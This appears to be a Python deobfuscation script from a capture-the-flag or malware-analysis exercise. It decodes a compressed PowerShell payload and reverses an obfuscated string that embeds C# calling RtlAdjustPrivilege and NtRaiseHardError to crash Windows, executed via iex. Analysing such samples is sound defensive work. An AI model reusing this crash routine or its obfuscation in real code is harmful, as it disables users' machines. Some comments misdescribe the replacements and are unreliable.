import base64
import zlib

# The new Base64 string from the PowerShell script
b64_data = "TVRrc9o6EP0rmn7BnmIXkpBJ4uED5dGQGx5jCKTO5IMfApTalkeWuSS9/e93jwykzGh3La2Ozh6tYNaL4tvh4fXuLuvp/m64sNgX276+fPV79/2Xpt1ptevwa+v2GLRPUxZjw37vsRj6DmNXpy0N/3rROM/fnpEu2iekq5tjcHOEtIZxLy24HzvMbtiNrw3bJpBud9unuKAxficT0/hYXfzcP9w/iV7/kT5Fi8z9JB0NZr8e3gL66PwaBKlPwTK4ItujQWvBepIGH5Ns9zbZ0cz35bQVf0wuKSwvsWt3yMgGAjtq4Hj9swyysXz6EYnROnwf0WS2anXIrQPduYje0yypVsMknaaz69aI4nVU3WZxEeTRqLOIUv8ShDtTMu01lWNtc+Arvbi65mX4PZP4Au7d3atWfJ9TKPsvZJFKeRRp/sO9IT9aknmiRFpJZJwPXX3gqNKkswMXnm1pAOwWlEXB84uH80WANFYqrjlqDFVIdq54CjJFJvsO1isFXZZliZS5w7Cmwt2iz/g2rLagFj46rPxEzEFfaGGK2vABxz3hmpYOq+Olk5BLet0QKZCZe3Sv5BdpihUabsZ1+b6APHUy5nAKzhDIisCaG2K9BLNxzhXfcN+NDSz3CmgT8U1Y5tU3nLyMumUuhUY8U9ieClTqYreoidSCkBpGCmSa++i76pSMc+UAyQm+DE/oomP+Fs2cf48kp12CJBLm3D9/PFsxXUnWRJ2sae6YB67C3cw1dByzJtnWyV6Qw2jRDw4cDy0L+yS4q2ECh1u756WA9/XUwyMBZn0YL1MsbCiqlGbN27YFbluqZS/UHIkQsHpLeqn2PaKYi8rTDAJLGf0+9w4QEyH38EDY4GjSlRmxdahLitKoKugmAQJQooDNrLkyfMgQOGvOmdJUMZX7ZOZpEp5Gc2p0NFnD05r1WW5IheL6QyrUrLHcyAjoA/+LyvFPwRB6tfHqj92VuDR0jrbSSppGH6PWdID34tkzlmJWRmcFlzQjI+IDj35CAXUteGF8W7cRhIGgJWqBmqDin2pg+YkkZmJx0gt4hqGhBx6m/91zZKjiHGJboPHGaU319zMryzCNAXbsgk9IiI++80oei73iQCgkUTBt5vJM6Lzyj60LRvTnUVbesZXNo6bvAs8Fj9qyLPbMx+wLtaZLvdtQ4+39UsvH4Ug3mO08SDFtUMD+Y+PpSv7DHf5cKF4uxnL6Pw=="

decoded_bytes = base64.b64decode(b64_data)

# DEFLATE decompression
# The -zlib.MAX_WBITS argument tells zlib to expect a raw DEFLATE stream
# (no zlib header or checksum), which is what PowerShell's DeflateStream produces/expects.
try:
    decompressed_data = zlib.decompress(decoded_bytes, -zlib.MAX_WBITS)
except zlib.error as e:
    print(f"zlib decompression error (raw DEFLATE): {e}")
    # As a fallback, try without specifying wbits, in case it has a zlib header
    try:
        print("Retrying with standard zlib header assumption...")
        decompressed_data = zlib.decompress(decoded_bytes)
    except zlib.error as e2:
        print(f"Second zlib decompression error: {e2}")
        decompressed_data = b"DECOMPRESSION_FAILED"


# The script uses ASCII encoding for the final result
final_payload = decompressed_data.decode(
    "ascii", errors="ignore"
)  # 'ignore' or 'replace' for problematic bytes

print("--- Decompressed Payload ---")
print(final_payload)

import base64
import re

# The long string from your final decoded payload (before reversal and execution)
obfuscated_string_to_reverse = "))63]RAHC[,)501]RAHC[+09]RAHC[+101]RAHC[(  ECALpER-  43]RAHC[,'R6S'ECALpER-  93]RAHC[,)211]RAHC[+48]RAHC[+89]RAHC[(EcAlpeRc- )')'+'))R6S==gCpIyczV2YvJHUiACLi0HMlFDOkJjZ5kDZlRTZ4ADOkZWMlZzMmhjMhBTN0czM3s3ZhxmZiACLicWYsZmIoUGbiFWayFmV05WZt52bylmduVEdlNlO60FduVWbu9mcpZnbF5SblR3c5N1WR6S(gnirtS46esaBmorF::]trevnoC[(gnirtSteG.8FTU::]gnidocnE.txeT[( xei;)(tohS::]X[;ciZe sretemaraPreliPmoC- urhTssaP- prahSCegaugnaL- siZe noitinifeDepyT- epyT-ddA=aiZe;)R6Slld.metsySR6S(ddA.seilbmessAdecnerefeR.ciZe;pTbefasnu/pTb=snoitpOrelipmoC.ciZe;sretemaraPrelipmoC.relipmoC.moDedoC.metsyS tcejbO-weN=ciZe;pTb}};)r tuo ,6 ,oreZ.rtPtnI ,0 ,0 ,2200000cx0(rorrEdraHesiaRtN;)t tuo ,eslaf ,eurt ,91(egelivirPtsujdAltR;r tniu;t loob{)(tohS diov efasnu citats cilbup;)R tniu tuo ,V tniu ,P rtPtnI ,U tniu ,N tniu ,E tniu(rorrEdraHesiaRtN tniu nretxe citats cilbup])R6Slld.lldtnR6S(tropmIllD[;)O loob tuo ,T loob ,E loob ,P tni(egelivirPtsujdAltR tniu nretxe citats cilbup])R6Slld.lldtnR6S(tropmIllD[{X ssalc citats cilbup;secivreSporetnI.emitnuR.metsyS gnisu;metsyS gnisupTb=siZe"

# Step 1: Reverse the string (PowerShell's RightToLeft regex match)
reversed_powershell_code = obfuscated_string_to_reverse[::-1]

print("--- Reversed PowerShell Code (Raw) ---")
print(reversed_powershell_code)
print("-" * 40)

# Step 2: Simulate the CHAR replacements that PowerShell would do.
# These replacements were identified as:
# - (CHAR[101]+CHAR[90]+CHAR[105]) which is "eZi", replaced by CHAR[36] which is "$"
# - 'S6R' replaced by CHAR[34] which is '"'
# - (CHAR[89]+CHAR[48]+CHAR[112]) which is "Y0p", replaced by ']RHC['
# We also identified 'bpT' and 'pTb' as likely junk/markers.

# Apply replacements to make the PowerShell (especially the C# part and variable names) more readable
# This step helps understand the *entire* script, including the crashing part.
partially_deobfuscated_ps = reversed_powershell_code
partially_deobfuscated_ps = partially_deobfuscated_ps.replace(
    "eZi", "$"
)  # "eZi" -> "$"
partially_deobfuscated_ps = partially_deobfuscated_ps.replace(
    "S6R", '"'
)  # "S6R" -> '"' (double quote)
partially_deobfuscated_ps = partially_deobfuscated_ps.replace(
    "bpT", ""
)  # Remove junk marker
partially_deobfuscated_ps = partially_deobfuscated_ps.replace(
    "pTb", ""
)  # Remove junk marker
# The "Y0p" to "]RHC[" replacement is: (CHAR[89]+CHAR[48]+CHAR[112]) -> "Y0p"
# The PowerShell is: -cRlepHaC[(CHAR[89]+CHAR[48]+CHAR[112]) ,']RHC['
# This means "replace 'Y0p' with ']RHC['". This is unusual for typical deobfuscation.
# It doesn't seem to affect the flag decoding part, more likely related to mangling parts of the C# string.
# For clarity, let's apply it:
partially_deobfuscated_ps = partially_deobfuscated_ps.replace("Y0p", "]RHC[")


print("--- Partially Deobfuscated PowerShell (for readability of C# and vars) ---")
print(partially_deobfuscated_ps)
print("-" * 40)

# Step 3: Extract and decode the final Base64 string that contains the flag command.
# The relevant part in 'partially_deobfuscated_ps' looks like:
# iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"W1N5c3RlSnblZnb0F6OlN0ZEdubVlmcGFuZ0VicUFiZiMxZHM3MzN0MhczhmVkZkADO4TRlZk5jZDOFlHM0ICUiJvYvV2ZyczIpCRgC=="')))
# (Note: S6R was replaced by " above, so the Base64 string is now quoted and without S6R)

# Regex to find the content inside FromBase64String('...') or FromBase64String("...")
# It should capture the Base64 data, potentially with the S6R delimiters if we used `reversed_powershell_code`
# or with quotes if we used `partially_deobfuscated_ps`.
# Let's target the structure from 'partially_deobfuscated_ps' where S6R became ".
match = re.search(
    r"FromBase64String\(\"([a-zA-Z0-9+/=]+)\"\)", partially_deobfuscated_ps
)

if not match:
    # Fallback: Try to find it from the raw reversed string before S6R was replaced by "
    # This would look for 'S6R...S6R'
    match_raw = re.search(
        r"FromBase64String\('S6R([a-zA-Z0-9+/=]+)S6R'\)", reversed_powershell_code
    )
    if match_raw:
        base64_for_flag = match_raw.group(1)
        print(
            f"Found Base64 for flag (from raw reversed, S6R stripped): {base64_for_flag}"
        )
    else:
        print("Could not find the Base64 string for the flag in either form.")
        base64_for_flag = None
else:
    base64_for_flag = match.group(1)
    print(f"Found Base64 for flag (from partially deobfuscated): {base64_for_flag}")


if base64_for_flag:
    try:
        # Decode Base64
        decoded_bytes = base64.b64decode(base64_for_flag)
        # Decode UTF-8 bytes to string
        final_command_or_flag = decoded_bytes.decode("utf-8")

        print("\n--- Final Decoded Command/Flag ---")
        print(final_command_or_flag)

    except Exception as e:
        print(f"Error during final Base64 decoding or UTF-8 conversion: {e}")
        print(f"Base64 string attempted: {base64_for_flag}")

else:
    print("No Base64 string for the flag was extracted.")
